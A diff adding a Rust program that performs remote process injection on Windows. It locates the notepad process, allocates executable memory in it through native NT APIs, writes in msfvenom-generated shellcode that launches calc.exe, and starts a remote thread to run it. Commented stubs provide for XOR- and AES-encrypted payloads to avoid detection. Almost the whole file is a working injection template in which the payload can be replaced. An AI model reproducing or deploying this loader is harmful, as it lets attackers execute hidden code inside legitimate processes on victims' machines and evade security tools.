@@ -1,0 +1,174 @@
+//use libaes::Cipher;
+use sysinfo::{Pid, ProcessExt, SystemExt};
+
+use std::{
+    default::Default,
+    ffi::c_void,
+    ptr::null_mut,
+};
+
+use ntapi::{
+    ntpsapi::{NtOpenProcess, NtCreateThreadEx},
+    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
+    ntapi_base::{CLIENT_ID}
+};
+
+use winapi::{
+    um::{
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
+        lmaccess::{ACCESS_ALL}
+    },
+    shared::{
+        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
+    }
+};
+
+fn main() {
+    let process_id = get_process_id_by_name("notepad");
+
+    println!("process ID: {}", process_id);
+
+    inject_shellcode(process_id);
+}
+
+fn inject_shellcode(process_id: Pid) {
+
+    unsafe {
+        let mut oa = OBJECT_ATTRIBUTES::default();
+
+        let mut process_handle = process_id as HANDLE;
+
+        let mut ci = CLIENT_ID {
+            UniqueProcess: process_handle,
+            UniqueThread: null_mut(),
+        };
+
+
+        let mut status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
+
+        if !NT_SUCCESS(status) {
+            panic!("Error opening process: {}", status);
+        }
+
+        //
+        //xor encrypted shellcode goes here.
+        //
+
+        //let xor_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
+        //let mut shellcode: Vec<u8> = xor_decode(&encoded_shellcode, 0xDA);
+
+        //
+        //aes encrypted shellcode goes here
+        //
+
+        //let aes_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
+        //let mut shellcode: Vec<u8> = aes_256_decrypt(&aes_shellcode, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337", b"This is 16 bytes");
+        
+        //
+        //default shellcode goes here
+        //
+
+        //msfvenom -p windows/x64/exec CMD="calc.exe" -f rust
+        let mut buf: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
+        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
+        0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
+        0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
+        0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
+        0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
+        0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
+        0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
+        0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
+        0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
+        0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
+        0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
+        0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
+        0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
+        0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
+        0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
+        0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
+        0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
+        0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
+        0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
+        0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
+        0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
+        0x2e,0x65,0x78,0x65,0x00];
+                
+
+        let mut shellcode_length = buf.len();
+
+        let handle = process_handle as *mut c_void;
+        let mut base_address : *mut c_void = null_mut();
+        status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+
+        if !NT_SUCCESS(status) {
+            panic!("Error allocating  memory to the target process: {}", status);
+        }
+
+        let mut bytes_written = 0;
+
+        let buffer = buf.as_mut_ptr() as *mut c_void;
+        let buffer_length = buf.len();
+
+        status = NtWriteVirtualMemory(handle, base_address, buffer, buffer_length, &mut bytes_written);
+
+        if !NT_SUCCESS(status) {
+            panic!("Error writing shellcode to memory of the target process: {}", status);
+        }
+
+        let mut thread_handle : *mut c_void = null_mut();
+
+        status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());
+
+        if !NT_SUCCESS(status) {
+            panic!("Error failed to create remote thread: {}", status);
+        }
+    }   
+}
+
+fn get_process_id_by_name(target_process: &str) -> Pid {
+    let mut system = sysinfo::System::new();
+    system.refresh_all();
+
+    let mut process_id = 0;
+
+    for process in system.process_by_name(target_process) {
+        process_id = process.pid();
+    }
+
+    return process_id;
+}
+
+/* 
+fn xor_decode(shellcode: &Vec<u8>, key: u8) -> Vec<u8> {
+    shellcode.iter().map(|x| x ^ key).collect()
+}
+*/
+
+/* 
+fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
+    // Create a new 128-bit cipher
+    let cipher = Cipher::new_256(key);    
+    
+    //Decryption
+    let decrypted = cipher.cbc_decrypt(iv, &shellcode);
+
+    decrypted
+}
+*/
+
+/*
+fn get_input() -> io::Result<()> {
+    let mut buf = String::new();
+    std::io::stdin().read_line(&mut buf)?;
+    Ok(())
+}
+
+/// Used for debugging
+fn pause() {
+    match get_input() {
+        Ok(buffer) => println!("{:?}", buffer),
+        Err(error) => println!("error: {}", error),
+    };
+}*/
